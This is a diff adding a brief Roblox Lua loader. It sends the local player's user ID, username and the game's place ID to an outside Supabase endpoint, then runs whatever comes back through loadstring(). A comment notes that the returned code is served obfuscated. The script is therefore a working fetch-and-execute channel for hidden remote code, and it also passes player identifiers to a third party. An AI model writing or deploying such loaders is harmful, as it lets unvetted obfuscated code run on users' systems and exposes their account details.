@@ -1,0 +1,14 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local url = "https://zpixqisudqyksxwadwik.supabase.co/functions/v1/serve-paste"
+  .. "?key=YOUR_API_KEY"
+  .. "&userId=" .. tostring(player.UserId)
+  .. "&username=" .. player.Name
+  .. "&placeId=" .. tostring(game.PlaceId)
+
+local response = HttpService:GetAsync(url)
+
+-- Script is served obfuscated automatically
+loadstring(response)()
